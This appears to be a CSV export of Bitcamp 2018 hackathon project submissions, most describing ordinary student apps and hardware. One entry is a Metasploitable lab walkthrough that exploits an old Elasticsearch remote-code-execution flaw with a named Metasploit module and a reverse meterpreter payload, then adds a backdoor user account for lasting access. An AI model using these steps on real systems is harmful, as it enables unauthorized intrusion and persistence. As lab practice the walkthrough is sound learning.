All due credits to:
Jonathan Goldsmith for the Wikipedia scraping library and
to Google for Google APIs
",https://github.com/gandhi-21/Bitcamp,"Most Futuristic Hack - Paypal, Most Unique Hack - 1517 Fund, Best Hack (be passionate) - Facebook",No,,,
CleanShot,http://bitcamp2018.devpost.com/submissions/92371-cleanshot,"Inspiration

We wanted to build a roomba with local vision processing for real time targeting

What it does

Shoot nerf darts at all who cross it's path

How we built it

We connected the Kinect to the Raspberry Pi, and started getting them to work together.
This involved setting up and installing various libraries and firmwares, and some source compilation
to get some of the older more outdated libraries to work. Then we started getting vision processing to work on the Pi, and getting a skeleton from the Kinect. This involved further more library searching, compilation, and testing. In the meanwhile, we also had to develop a mount and firing mechanism for the Nerf gun. This required multiple 3d printed parts to be designed and printed, as well as some modification to the body of the Nerf gun. We also had to find ways for C and Python to communicate data from one to the other in a manner they both understood.

Challenges we ran into

3d Printing 
connecting Kinect to Raspberry Pi
Installing drivers for Kinect on Raspberry Pi
Installing skeleton tracking software on the raspberry Pi
Getting Skeleton information into Python
Automating Nerf gun firing
Designing mounts
Soldering wires
Kinect is often deprecated

Accomplishments that we're proud of

We managed to make a lot of discontinuous libraries communicate and send each other information, and use said information

What we learned

The Kinect is an older piece of hardware, and has outdated libraries to match. Getting old libraries to work takes a lot of leg work.

What's next for CleanShot
",https://github.com/jonaylor89/Bitcamp2018,"Most Futuristic Hack - Paypal, Most Unique Hack - 1517 Fund, Best Hack (be passionate) - Facebook",,Sarmentoaj,jonaylor89,
AirDJ,http://bitcamp2018.devpost.com/submissions/92372-airdj,"Air DJ

Leap Motion Hackathon Bitcamp 2018
by Pranav Maniktala,
Saajid Farooq,
Sepehr Hajbarat,
 and Will Boodon

AirDJ is a unity based music development application  using leap motion allowing users to make beats with their bare hands.
https://www.youtube.com/watch?v=KBGZVMRyLz0



Within AirDJ is a hand sign based application called the meme machine
",https://github.com/Saajidf/Bitcamp_2018,"Most Futuristic Hack - Paypal, Most Unique Hack - 1517 Fund, Best Hack (be passionate) - Facebook",no,pranav-manik,,
future-funk-generator,http://bitcamp2018.devpost.com/submissions/92375-future-funk-generator,"Future Funk Generator

generates an artist, album, song titles, and album art to help you start your future funk soundcloud career



run npm install once this repo is downloaded

then hop into a terminal and run node index.js

finally open a browser and head to localhost:3000
",https://github.com/sbower213/future-funk-generator,,,,,
VocaLearn,http://bitcamp2018.devpost.com/submissions/92376-vocalearn,"clone repo
then exec:

npm install
",https://github.com/christian-rncl/VocaLearn,"Best Use of AWS - Amazon Web Services, Best Domain Name - Domain.com, Best Designed Investor Education Product - Finra, Most Unique Hack - 1517 Fund, Best Hack (be passionate) - Facebook, Best Accessibility Hack - Microsoft",,mahirsjhaveri,shane-miller,
Rally (iOS app),http://bitcamp2018.devpost.com/submissions/92377-rally-ios-app,"Inspiration

Seeing everyone who didn't have a team at the beginning of Bitcamp made us realize that there is a need for an app that connects people with groups. People need groups in companies to develop projects, people need groups to travel to different countries, people need groups to go to a different city (for break for example). ** Need a team? Rally up! **

What it does

Connects groups of people together

How we built it

Since each member was responsible for a different aspect of the project, each of us built it different. I built my end using Xcode and swift, while the web part was developed using javascript, css, html and the mongoDB backend

Challenges we ran into

Authenticating users, integrating backend infrastructure, GUI issues on mobile

Accomplishments that we're proud of

Each team member tackled a problem they haven't encountered before and tried to solve it (ie 

What we learned

I learnt some swift and more about GUI's in iOS

What's next for Rally (iOS app)

Make it a fully functional, cross platform app with a user friendly GUI, used by everyone
",,"Best Domain Name - Domain.com, Best Use of MongoDB Stitch - MongoDB, Most Unique Hack - 1517 Fund, Best Hack (be passionate) - Facebook",no,,,
HOW TO HACK A COMPUTER: REMOTE CODE EXECUTION,http://bitcamp2018.devpost.com/submissions/92378-how-to-hack-a-computer-remote-code-execution,"Inspiration

What it does

How I built it

Challenges I ran into

Accomplishments that I'm proud of

What I learned

What's next for HOW TO HACK A COMPUTER: REMOTE CODE EXECUTION

OVERVIEW:
I performed a nesses scan on a Metasploitable VM to find vulnerabilities. I used one of these vulnerabilities to get Remote access to the Metasploitable VM from my Kali VM.  I used Metasploit in my Kali VM to hack the vulnerabilities and get a shell. I am including the screenshot of the payload I used and the commands I used. We will also add a user to get future access to the target machine.
HACK:
The IP address of my Metaspolitable VM is 192.168.217.129.
step 1: So the first step to get remote access to a computer is to get the IP address of that computer.
Step 2: Perform a scan to check for vulnerabilities. I performed a Nessus scan. I first downloaded and installed Nessus on my kali VM. After installation, I opened Nessus in a browser in my host system for bigger screen size by going to this URL https://kali.ip:8834. The IP address of my kali VM is 192.168.217.137 so I used the URL https://192.168.217.137:8834 (port 8834 is a TCP/UDP port). After Nessus has been successfully installed we click on ���+ New Scan�۪ in the main Web UI. We enter the IP address of our target machine.
Step 3: SELECT A VULNERABILITY:
I found many vulnerabilities in that system. I chose the Elastic Search vulnerability. The target machine is running an older version of Elastic Search v 1.1.1 which is an older and unpatched software running on the target machine. (it is advisable to update the software installed with new patches to avoid getting hacked).
Step 4: use the command msfconsole to open Metasploit in Kali VM.
Step 5: reconfirm the presence of the installed software that contains the vulnerability you are going to exploit. we will use the following command line code
msf> use exploit/multi/elasticsearch/script_mvel_rce
We set the rhost to the ip address of the target machine.

Step 6: I wrote this payload to get shell access.
'Set payload java/meterpreter/reverse_http'

Step 7: we got shell access. Now we will add a user to the group so we can get an account in the target system and we can access the system anytime in the future.
Step 8: username of the account: spring2018
    Password:spring2018
 use the command ���net user spring2018 spring2018 /add�۪

We just owned a machine!!!!!!!
",,"Most Unique Hack - 1517 Fund, Best Digital Forensic Hack - Cipher Tech Solutions",R1-6,,,
Color Clicker,http://bitcamp2018.devpost.com/submissions/92380-color-clicker,"Inspiration

We simply wanted to make our first app. Even though its simple, we wanted to create a game that showed what we know currently. I personally didn't know anything about coding with android studio but I learned in those 3 days because I wanted to.

What it does

The main objective is to score as many points without clicking the wrong button or running out of time. There are two buttons, each a different color. Above those boxes is a prompt that says a color; and so, you have to click the right one. However, every time you click one correctly, the timer goes down very slightly, making a more intense game. Also, we tried to trick people by change the color of the prompt. For example the word ""Blue"" was in red letters and the two buttons were red and blue.

How we built it

We built it on android studio. We used many activities and windows to make the app feel like a professional game.

Challenges we ran into

Not many. There were some logical errors that messed up the code and putting constraints for the buttons caused some buttons to overlap with others.

Accomplishments that we're proud of

Just getting it to work. The game may look easy but there are so many steps to get something to work.

What we learned

We learned about android studio, new functionality with it, and how awesome having a team is for a project.

What's next for Color Clicker

We are considering adding more game modes such as casual and arcade modes.
",,,No,,,
Mistake,http://bitcamp2018.devpost.com/submissions/92381-mistake,"Accidentally created this, how do I delete this?
",,,,,,
Art with Python - Exploration with Random Loops,http://bitcamp2018.devpost.com/submissions/92382-art-with-python-exploration-with-random-loops,"Inspiration

I was inspired by the art and tech show ""Immersive Atoms."" I wanted to learn a language (python) by creating art with it. I was also fascinated by the idea of randomness when creating art. I wanted to include as many random components as possible while still ensuring that the end result is aesthetically interesting. I love the fact that the computer is the one to ""make"" the art and ""make"" the decisions within a set of parameters. 

What it does

It makes colorful and interesting shapes. 

How I built it

Coded with python.

Challenges I ran into

I had a hard time making things appear in random places and within the bounds of the Turtle window. 

Accomplishments that I'm proud of

I have come further than I expected and I like that I show multiple skills that I learned in the animation. 

What I learned

I learned python! I am much more comfortable with coding in general as well. Excited for my new project. 

What's next for Art with Python - Exploration with Random Loops

I would like to have some sort of user interface with the art. 
",https://github.com/esadikova/artwpython,,,,,
Racing Yeti Simulator,http://bitcamp2018.devpost.com/submissions/92383-racing-yeti-simulator,"So I came into this hackathon with absolutely zero programming knowledge. I watched a bunch of online tutorials and this is the culmination of what I have learned this hackathon. A lot of fooling around, but it was fun!

This is a very simple text game where you start with $100 and can bet money on a Yeti each round. A short text animation is displayed for each race, and you can play until you run out of money or want to leave!
",,,"please don't make me ""demo"" this i am a noob",,,
MotOBDII,http://bitcamp2018.devpost.com/submissions/92384-motobdii,"Inspiration

Inspired by Vinli a platform that turns older cars into smart cars plugging IoT devices in to their ODBII port, bringing them in to the realm of smart devices. MotODBII seeks to accomplish this for motorcycles as well, allowing Motocycles to receive the same data for preventative diagnostics and giving drivers a blockchain.

What it does

Simulation and blockchain platform that shows that impact that IoT could have on Motorcycles.

How I built it

Part I: Arduino + RaspberryPi hardware simulation of a Motorcycle or moped.
Part II: 

Challenges I ran into

Accomplishments that I'm proud of

Collaborating in team of people with different backgrounds and skill levels.

What I learned

What's next for MotOBDII

Possibly prototyping a device to get data from a Motocycles computer
",https://github.com/coderrick/bitcamp-spring-2018/,"Decentralise Everything: Blockchain challenge - Ark, Best Use of AWS - Amazon Web Services, Best Domain Name - Domain.com, Most Futuristic Hack - Paypal, Best Financial Hack - Capital One, Best Use of MongoDB Stitch - MongoDB, Most Unique Hack - 1517 Fund, Best Hack (be passionate) - Facebook, Best Hack with Esri APIs and SDKs - Esri",YES,jcweaver,BryannaNicholeGrant,
Augmented Reality Presentation Tool,http://bitcamp2018.devpost.com/submissions/92385-augmented-reality-presentation-tool,"ARPT

Created by Harrison Linowes and Mike Bartner

Requirements

Android device capable of running Firefox Nightly.

Testing Steps

To host:

On Firefox Nightly, go to http://ec2-34-235-88-175.compute-1.amazonaws.com/Client/bitcamp.html
  Allow the website to share your camera.
  Point your camera at the image found here: https://upload.wikimedia.org/wikipedia/commons/0/08/Pattern-hiro.png
  Select rotate to manipulate object on axis, position to move object on the grid, and pinch to scale.

To observe:

On Firefox Nightly, go to http://ec2-34-235-88-175.compute-1.amazonaws.com/Client/observe.html
  Allow the website to share your camera.
  Point your camera at the image found here: https://upload.wikimedia.org/wikipedia/commons/0/08/Pattern-hiro.png
  Observe.

Inspiration

We were inspired by movies such as the Avengers where the team looks at AR holograms before going on a mission. The idea that a group of individuals can easily view and interact with a hologram to facilitate understanding is futuristic but possible with today's technology.

What it does

ARPT allows users to visit a web page on a mobile or desktop device where they can view augmented reality holograms of various models such as 3D landscapes, machined components, or 3D data visualizations. With ARPT a presenter can control the model's position, rotation, and scale in order to modify it for easiest understanding by the group. As the presenter modifies the model it will be updated on observers view port in real time.

This technology can be used in various situations for a variety of people. ARPT is web based making it accessible to all people with web enabled devices, this overall allows anyone with a mobile device to easily and comfortably view the presentation. Other applications of ARPT are for visualizing models and 3D terrain maps on the go, including disaster and rescue situations when proper presentation equipment is not available.

How we built it

We built ARPT using node.js, javascript, three.js, and aframe.

Challenges we ran into

We ran into challenges related to transferring data on the server.

Accomplishments that we're proud of

We are excited that we were able to connect devices and properly update elements of the model for all users.
",https://github.com/MBartner/bitcamp2018,Best Hack for Aiding Natural Disaster Recovery Efforts - Booz Allen Hamilton,No,,,
DareDevil,http://bitcamp2018.devpost.com/submissions/92386-daredevil,"Inspiration

We believe in power in unity.

What it does

It helps visually impaired people in their daily lives.

How we built it

We used natural language processing tools to understand the environment around the person and help him understand it better. 

Challenges we ran into

Natural language understanding of the user

Accomplishments that we're proud of

Able to design a futuristic project which will help mankind to achieve more in Life

What we learned

Human - Aware Artificial Intelligence's Importance and Challenges associated with it.

What's next for DareDevils

Build this product for the production level with the integration of command requires for better UX.
",,"Most Futuristic Hack - Paypal, Best Use of MongoDB Stitch - MongoDB, Most Unique Hack - 1517 Fund, Best Philanthropic Hack - Bloomberg, Best Hack (be passionate) - Facebook, Best Accessibility Hack - Microsoft",Not Necessary,SANCHITNARANG,shuchirinamdar,
 Serendipity,http://bitcamp2018.devpost.com/submissions/92387-serendipity,"Inspiration

With growing number of recent data privacy incidents such as Facebook's data scandal, we wanted to introduce a newly renovated design of decentralized social media platform. With this model, there is no central entity that controls your information. Instead, each users will have a total control over his/her database and how the data will be shared among friends. 

What it does

When a user signups with Serendipity, the user will be able to choose it's own identifier and a domain name. This domain will then spin up it's own full-stack which includes, front-end service, back-end service, and a database within the domain. The user will then start posting posts into his own timeline which are saved in his own domain's database. Others will only be allowed to see the user's data once they are consented through friend requesting and being accepted.

How we built it

We have MongoDB database with Python's Flask backend. The frontend is made using vanilla JS, CSS3, and HTML5 with bootstrap. Our lightwight social media services are dockerized and ready to be spun up within seconds! 

Challenges we ran into


Sleep deprivation
Having low resistance level towards other fun hackathon activities
Setting up and debugging user interactions between different hosts
Datetime format between JS and Python


Accomplishments that we're proud of


Solid infrastructure planning
Successful base implementation
Beautiful UI design
Clear vision of our goals


What we learned


We need to sleep more
Get food last minute to avoid waiting in line forever
You can always ask for 2nd soylent bottle, they'll give it to you most of times
Getting AWS credits is annoying
Timestamps suck


What's next for Serendipity


Public-private key encryption
Credential management
User Authentication/Authorization
Data privacy per post
Blocked lists

",https://gitlab.com/team-serendipity/serendipity,,,clcain,,
Shotradar,http://bitcamp2018.devpost.com/submissions/92388-shotradar,"Inspiration

With the recent mass shooting events that are occurring throughout the United States, we wanted to help keep people safe and know what to do during this event. We realize that there is not much training that is occurring, and even if someone is trained in a situation, there is generally a fight or flight response due to panic. Therefore, this app will give advice based on the location of the shooter and where they are in a building. 

What it does

Currently what the app does is determine the last possible location of their suspect based on sound wave frequency analysis and amplitude of the sound wave. The person whom the app would detect as a suspect would be someone who clapped their hand, and it would say which device it came from. 

How we built it

We wrote the sound wave analysis tool in JavaScript. If a positive match was met, it would then communicate with our server that we built in Node.js to send to all device which device heard the suspect last. This was able to be accomplished with socket.io and Ajax.  We used HTML and CSS to display the content on a webpage. 

Challenges we ran into

Initially, we tried to use geolocation in order to get an exact location of where the suspect could be; however, during the middle of Bitcamp, the network had to be reset; thus, forcing the geolocation to proxy to California. This was also the same occurrence for LTE (even though we have no idea why this is the case). As a result, we had to create a solution quickly in order to present at the end of Bitcamp (which is our current solution). 

Accomplishments that we're proud of

We are most proud of sticking through until the end, even though we had many problems throughout the entire hackathon. 

What we learned

Along with all of the new coding skills, we were able to learn about how sound waves work at a deeper level because this project required us to analyze the sound wave of a clap for our mapping functionality to work. We also learned about ShotSpotter and how we can create a solution that targets an issue unsolved (saving lives when mass shootings occur in buildings). 

What's next for Shotradar

Since we decided to do the venture trail for Bitcamp, what we are going to do next is determine if our business model is sound. When pitching to potential clients, we would tailor the map to their building so that our application can be as effective as possible. If it is confirmed, we would create a version of the application where Geolocation works and uses machine learning to become better over time. 

Demo


http://ter.ps/location
To reset the app on the server side: https://floating-gorge-79216.herokuapp.com/reset


We will also see determine if there are other use cases for the app because we see the geolocation being useful for natural disaster relief and preparation.
",https://github.com/mwittner2/shotradar,"Best Use of AWS - Amazon Web Services, Best Domain Name - Domain.com, Best Hack for Aiding Natural Disaster Recovery Efforts - Booz Allen Hamilton, Most Futuristic Hack - Paypal, Most Unique Hack - 1517 Fund, Best Philanthropic Hack - Bloomberg, Best Hack (be passionate) - Facebook, Best Accessibility Hack - Microsoft",,shonkaga,,
Make it Rain,http://bitcamp2018.devpost.com/submissions/92389-make-it-rain,"Inspiration

Fighting forest fires. Saving trees. 

What it does

This app allows users to send money via making it rain to their friends in one dollar increments.

How we built it

Express, react, node, stack 

Challenges we ran into

Not fully understanding the API and javascript

Accomplishments that we're proud of

We implemented the ESRI API in locating thirsty friends.

What we learned

How to use React-native, javascript, HTML, and ESRI API

What's next for Make it Rain

Integrating with Ark.io to make it rain with ark coins
",https://arkham.localtunnel.me,"Best Financial Hack - Capital One, Most Unique Hack - 1517 Fund, Best Hack (be passionate) - Facebook, Best Hack with Esri APIs and SDKs - Esri",no,scao,,
UNICOMP,http://bitcamp2018.devpost.com/submissions/92391-unicomp,"Link to the updated project: 

https://devpost.com/software/unicomp
",,"Most Unique Hack - 1517 Fund, Best Hack (be passionate) - Facebook, Best Accessibility Hack - Microsoft",,saagarwal13,,
EURECA,http://bitcamp2018.devpost.com/submissions/92396-eureca,"Inspiration

It's spring, and cherry blossom bloom. I asked myself what if I could create and move cherry blossom leaves with my hands; moreover, what if I can create art? what if anyone can create art? That would help so much people out since there are so many great things about art! 
   I connected to my own experience of getting scared at fireworks. So to overcome the fear of fireworks, I thought this way of approach in therapy would have been great for me, and obviously someone else who were also scared at fireworks.

What it does

People discover themselves through EURECA! People gain encouragement, confidence, and self-esteem by creating amazing art with technology. And also recover themselves from traumas.

How we built it
Through excessive amounts of research, understanding the power of arts, we applied the concepts with technologies such as wearable gesture control and motion control device - Myo armband, and Unity3D. 

Challenges we ran into

lack of time to fulfill all the traumatic cases that we really wanted to cover such designing special therapy theme for Natural Disasters care.

Accomplishments that we're proud of

We delivered the power of art through these technologies, and made people happy at the end!

What we learned

That there are way too much people in need of therapy, but the there's too small amounts of therapy available, and they are too inefficient, and sometimes affordable. We need these kind of technologies.

What's next for EURECA

more experiences and effects, user specified experience ex) for people who lost home by flood, calm rain effect for trauma curing.
",,"Best Hack for Aiding Natural Disaster Recovery Efforts - Booz Allen Hamilton, Most Unique Hack - 1517 Fund, Best Philanthropic Hack - Bloomberg, Best Hack (be passionate) - Facebook","No but out hack needs space on the corner of the hacking space since it's interactive one, and it takes some space",yoonachoi,haleylee328,
Flow,http://bitcamp2018.devpost.com/submissions/92398-flow,"Inspiration

The inspiration for our project began when the three of us were tired of massive parking lot queues 

What it does

Our app controls the entire user experience as soon as they drive onto the stadium campus. Right off the bat, the app is used for parking validation and entering the premises: The user is then prompted through signs on the road to an optimal parking spot, avoiding all avoidable traffic. Once the user parks, the app memorizes where the user Parks and prompts the user to a Gate. From there, the user can find their seat, find food, find restrooms, or get live stat updates about the venue from the app. 

How we built it

The front end is split into three user experiences: the mobile app, the signs that prompt them to their parking locations, and on-site on-the-ground parking lights that direct users to their parking spots. 

The app itself is built on Xcode using Swift. The app communicates with beacons using bluetooth. We use our custom built metering algorithms, using signal strength as a function of distance. 

The prompting screens are static html pages hosted through an express.js server on mongodb Atlas. The page is updated using socket.io, culling data from the database. 

The ground lights are LEDs on a breadboard all connected to a central Arduino. This central Arduino hosts its own server to communicate to the database using flask and intel-edison. 

The backend is built using node.js, mongoDB, and flask. 

Each beacon is built with arduino 101s communicating

Challenges we ran into

One challenge we ran into was a variable metering response from the beacons. Because we are not using dedicated beacons, the signals were inconsistent due to environmental factors such as outside bluetooth interference, physical obstacles, and the physical limitations of the board. So, we wrote a high-pass function on the raw distances and took the average of the surrounding five data points to determine distances. 

Another challenge we ran into was trying to run a dynamic html page on Ruby on Rails. We needed to post a live page to instruct cars to turn, which had to be a single endpoint that would dynamically serve different images instructing the user. 

Another challenge we ran into was trying to get MongoDB Stitch on iOS to work. But alas, It didn't. 

Accomplishments that we're proud of

What we learned

What's next for Flow
",https://github.com/justinmay/bitcamp2018,"Most Futuristic Hack - Paypal, Best Financial Hack - Capital One, Best Use of MongoDB Stitch - MongoDB, Most Unique Hack - 1517 Fund, Best Hack (be passionate) - Facebook, Best Accessibility Hack - Microsoft","Yes, A5",ananduri9,vpuli98,
Invest Me,http://bitcamp2018.devpost.com/submissions/92399-invest-me,"Inspiration

What it does

Invest me is a stock simulator game designed to help familiarize collegiate students in investments.

Challenges we ran into

Finding the right design to create a user center design and ensuring that all requirements were created. We had to create and recreate our wireframe's multiple times until we came out with a design that we were happy with.

What we learned

We followed every step for a UX design. We learned the importance of wireframing and how feedback is the most important aspect for UX design. We learned that UI is an interpretation of what we think our users want, however UX is what our users need.

What's next for Invest Me

The next step for Invest Me is more usability testing. We may have been able to create a final prototype that we are happy with but this doesn't mean that our users would be happy with the product. Having more Usability testing will give us more feedback on our product allowing us to make changes till we are even more happier with our design. Finally would come prototyping for the design to see it in working action.
",http://prezi.com/5rmmmj1s80pq/?utm_campaign=share&utm_medium=copy,Best Designed Investor Education Product - Finra,No,,,
HawkEye,http://bitcamp2018.devpost.com/submissions/92404-hawkeye,"Inspiration

Traveling alone, whether in a familiar region or not can often be dangerous and frightening. You often only hear about criminal activity well after it has occurred, so there is generally no way of knowing if the area you are venturing towards will be safe or not. One of our group members, Trulee, expressed that her mom often reiterated the dangers of traveling alone and feared for her safety, whether she was away for college or out with her friends. Thus we came to the conclusions that if there was a way of keeping track of dangerous or suspicious activity in real time, everyone could travel more safely and with more peace of mind. 

What it does

HawkEye is a real-time crime map that allows users to drop pins to mark dangerous locations, so that other users get warned of the dangerous activity. Users can select a category of suspicious or dangerous activity from the drop down menu, and based on their selection, the pin's color will change in order to enable others to see trends and activity and know which areas to avoid. By crowdsourcing the reporting of crimes and suspicious activity, users will have access to a massive amount data regarding potential threats to safety in real time. Eventually, the app should be able notify other users if the happen to enter an area near a pin so that they don't necessarily have to be checking the app at all times. Currently the map has been overlayed with historical crime data using Esri's Map API, so that even if no pins are placed, users can see the historical trends of crime in certain areas.

How we built it

We built this app in Android Studio using Esri's Android Map SDK. Esri provided the base map platform for us to build upon, with which we integrated crime index data from their data sets in order to provide the historical crime heatmap overlay. We then built in the pin drop functionality using the Java and XML tools needed for Android Studio. 

Challenges we ran into

Integrating the map API and getting the pin drops to operate smoothly with the dynamic map were two of the biggest challenges. Since we have never used Esri's API before, it was definitely difficult to navigate the libraries and achieve what we wanted, but with hours of coding and help from Esri mentors, we were able to get the job done.

Accomplishments that we're proud of

We are proud of successfully integrating the Esri API, developing the historical map and designing color-coded pin drop functionality. These components were the main functional components of our platform that we worked hard to piece together from the ground up.

What we learned

We learned a lot about Esri's API and software development tools. More specifically, we learned how to construct a complex map interface using their base map layer, integrating their data sets, and combining the two using an operational layer overlay. We also learning some specific functionality such as placing marker points on the map in such a way that it sticks to a specific location and resizes as the map dynamically gets altered by the user. 

What's next for HawkEye

We hope to fully flesh out the location based notification feature. Essentially, based on the location of each pin, users who enter a 1-2 mile radius of the reported activity should get notified of the danger so that they do not have to check the app at all times to ensure their safety. We also want to complete the backend for the project so that a server can host the data and it can be shared and be up to date for all users of the app. This is obviously a vital component for this to work at it's fullest and we are already in the process of making this happen!
",https://github.com/amank98/HawkEye_BitCamp/tree/master/MyApplication,"Most Futuristic Hack - Paypal, Best Philanthropic Hack - Bloomberg, Best Hack (be passionate) - Facebook, Best Hack with Esri APIs and SDKs - Esri",,AbiSri,truleeriley,
TownHall 2.0,http://bitcamp2018.devpost.com/submissions/92405-townhall-2-0,"Inspiration: I always wanted to contribute to my community, but always despised town hall meetings

What it does: Create digital communities where members of a school, region, or relief effort can come together and discuss/collaborate on certain issues or how their community should be developed.

How I built it: I used a web editor and PowerPoint to create a mockup

Challenges I ran into: Being alone made it close to impossible to create the actual website for this hack, so I was forced to learn how to create mockups

Accomplishments that I'm proud of: The design has received much praise overall from fellow hackers who I pitched my idea to, even though I only have a mock up.

What I learned: It is very important to get a team first and try pitching your idea to them instead of trying to recruit people after team formation.

What's next for TownHall 2.0: Creating the website, of course
",,"Best Hack for Aiding Natural Disaster Recovery Efforts - Booz Allen Hamilton, Most Unique Hack - 1517 Fund, Best Accessibility Hack - Microsoft",No,,,
tensorscript compiler,http://bitcamp2018.devpost.com/submissions/92408-tensorscript-compiler,"Imagine a framework-agnostic DSL with strong typing, dimension and ownership checking and lots of syntax sugar. What would it be like? As interesting as it is, here is why there needs to a langauge for neural network:


Multi-target. Write once, run everywhere(interpreted in PyTorch or compiled to Tensorflow MetaGraphDef).
Typechecking with good type annotation.
Parallellize with language-level directives
Composition(constructing larger systems with building blocks) is easier
Ownership system because GC in CUDA is a nightmare
No more frustration from deciphering undocumented code written by researchers. The issue is, an overwhelming majority of researchers are not programmers, who care about the aesthetics of clean code and helpful documentation. I get it - people are lazy and unsafe unless the compiler forces them to annotate their code.


About syntax:


Stateful symbols are capitalized
Impure functions must be annotated
Local variables cannot be shadowed
Function args have keyword

use conv::{Conv2d, Dropout2d, maxpool2d};
use nonlin::relu;
use lin::Linear;

// three levels of abstraction: node, weights, graph
// ? stands for batch size, channel, height, width
// outputs tensor of shape [batch_size, 10]
node Mnist<?,c,h,w -> ?,OUT> {
    // define symbol level macro for both type/dimension and scope variable
    FC1 = 320;
    FC2 = 50;
    OUT = 10;
}
weights Mnist<?,c,h,w -> ?,OUT> {
    conv1 = Conv2d::<?,c,h,w -> ?,c,h,w>::new(in_ch=1, out_ch=10, kernel_size=5);
    conv2 = Conv2d::<?,c,h,w -> ?,c,h,w>::new(in_ch=10, out_ch=20, kernel_size=5);
    dropout = Dropout2d::<?,c,h,w -> ?,c,h,w>::new(p=0.5);
    fc1 = Linear::<?,FC1 -> ?,FC2>::new();
    fc2 = Linear::<?,FC2 -> ?,OUT>::new();
}
graph Mnist<?,c,h,w -> ?,OUT> {
    fn new() {
        fc1.init_normal(std=1.);
        fc2.init_normal(std=1.);
    }

    fn forward(self, x) {
        x
        |> conv1            |> maxpool2d(kernel_size=2)
        |> conv2 |> dropout |> maxpool2d(kernel_size=2)
        |> view(?, FC1)
        |> fc1 |> relu
        |> self.fc2()
        |> log_softmax(dim=1)
    }

    fn fc2(self, x: <?,FC2>) -> <?,OUT> {
        x |> fc2 |> relu
    }
}

compiles to 
from torch import nn, F

class Mnist(nn.Module):
    def __init__(self):
        super(Net, self).__init__()
        self.conv1 = nn.Conv2d(1, 10, kernel_size=5)
        self.conv2 = nn.Conv2d(10, 20, kernel_size=5)
        self.conv2_drop = nn.Dropout2d()
        self.fc1 = nn.Linear(320, 50)
        self.fc2 = nn.Linear(50, 10)

    def forward(self, x):
        x = F.relu(F.max_pool2d(self.conv1(x), 2))
        x = F.relu(F.max_pool2d(self.conv2_drop(self.conv2(x)), 2))
        x = x.view(-1, 320)
        x = F.relu(self.fc1(x))
        x = F.dropout(x, training=self.training)
        x = self.fc2(x)
        return F.log_softmax(x, dim=1)
",https://github.com/rickyhan/tensorscript-compiler,"Most Futuristic Hack - Paypal, Most Unique Hack - 1517 Fund, Best Hack (be passionate) - Facebook",,,,
"Bono - Invest Safe, Invest Smart",http://bitcamp2018.devpost.com/submissions/92413-bono-invest-safe-invest-smart,"Inspiration

Finance seems to seem like a foreign language, how then do you learn something that is so alien to you. This is a problem statement that Duolingo has mastered. We too inspirational guides from the concept and user experience of the app.

What it does

An interactive Hi-fidelity prototype that helps educate and onboard users into creating safe and smart investment choices.

How we built it

We conducted contextual interviews with our primary users, collected context about the organization its values and goals. Ideated by conducting storyboarding, visioning and created low-fidelity design iterations, conducted usability studies and then built a hi-fidelity website.

Challenges we ran into

We came into the challenge with little to no context about the organization or what their problem statement even meant. Most of our time was spent in content, context and user analysis.
We spent a lot of time ideating because we kept deviating from our problem statement. It felt like a challenge to fight the urge to build something cool instead of focusing on the usefulness.
All of the users we interviewed fit into the same box of people. This limited us to choosing the student persona.

Accomplishments that we're proud of

I think we really encaptured the organization's values with our visuals and stories.
We were true to our cause of educating self-starters.

What we learned

All it takes it a mindless activity to breakout from that ideation block

What's next for Bono - Invest Safe, Invest Smart

Our hi-fidelity prototype remains incomplete and will be completed and perfected once we recover our sleep.
",https://sketch.cloud/s/0Yp02,"Best Financial Hack - Capital One, Best Designed Investor Education Product - Finra",No,,,
PlopTab,http://bitcamp2018.devpost.com/submissions/92416-ploptab,"Inspiration

I previously been to at least 4 other hackathons in the past, all of which I have failed to learn something. This is the first time i ever felt like I actually learned something I can take with me.

What it does

takes in the user's website url input then whenever its clicked it opens the tabs.

How I built it

I built it with java script and html

Challenges I ran into

Understanding callback functions. And how it played a big part in my project.
learning Java script.
Understanding how to get a google extension up and running.
Being a one man team and my first time with anything to do with java script and html.

Accomplishments that I'm proud of

Having a working product of the project.

What I learned

Java script, html

What's next for PlopTab

creating a UI and adding certain buttons.
",https://github.com/Mighty-Mango/PlopTab,"Best Hack (be passionate) - Facebook, Best Accessibility Hack - Microsoft",,,,
eko,http://bitcamp2018.devpost.com/submissions/92417-eko,"Inspiration

To provide a mechanism for people to see the holistic costs of their investments

What it does

A web service that scrapes through publicly available environmental practices of Fortune 500 companies and creates a ranking of environmental impact

How I built it

I used Python to collect and parse the data and then assigned each company a score from 1 to 10 based on the environmental impact data that they may or may not have provided. I then used python to convert the data into a form presentable on the web

Challenges I ran into

Finding publicly available data was a lot harder than I imagined. I was, however, able to find public data sets from a company called CDP. This was also a first time app design for all of the team members involved so a lot of us struggled with finding the next step in the design process, but it was very rewarding to get that experience and learn about the process hands on

Accomplishments that I'm proud of

Since this is our (everyone in my team's) first hackathon, I'm proud to have experienced the design process from start to (almost) finish, even if we weren't able to implement all of the functionality we wanted to

What I learned

I learned new things about scraping data from web sites, I got my first hands on experience with MySQL and PostgreSQL, I learned about the blockchain, I learned a lot about the design process from start to finish, and finally I learned what it feels like to be part of a team with the goal of making a product in mind, and it was really fun and rewarding

What's next for eko

One thing we all are interested in implementing (and actually how this idea started in the first place) is making an environmentally conscious SIMS game. We could essentially use this as a template to demonstrate in an exaggerated manner the impact of these investments
",https://github.com/umterp/bitcamp-2018,,,ayeh01,,
Mapifier,http://bitcamp2018.devpost.com/submissions/92421-mapifier,"Inspiration

What it does

we like maps

How we built it

Challenges we ran into

Accomplishments that we're proud of

What we learned

What's next for Mapifier
",,"Best Use of MongoDB Stitch - MongoDB, Most Unique Hack - 1517 Fund, Best Hack (be passionate) - Facebook, Best Hack with Esri APIs and SDKs - Esri, Improving Healthcare with Mobile Technologies - Credible Behavioral Health, Best Accessibility Hack - Microsoft",,,,
busten_fakes,http://bitcamp2018.devpost.com/submissions/92435-busten_fakes,"Inspiration

One of my mentors was listing to NPR . Me about most of the verification site software does this by having you determining if we were humans and able to read and look at information an process considering that computers are bad at multitasking. It started out being something like that, but then what I got from th is that it would make sense to try and build should do build a tool that would look for data manipulations within jpg  to see if the data had been manipulated. 

What it does

It should allow look at the huffman encoding of a jpg to been whether or not   any changes have been determine not these changes make sense. 

How we built it

Two computers and lot compile time a-lot of looking at background information.

Challenges we ran into

Not knowing the language . This was a bit of a frustration for me, because I am not the most solid of coders.  

Accomplishments that we're proud of

Learning the language and being able to understand the coding practices of go  a bit more especial when it comes to the import error that can occur. 

What we learned

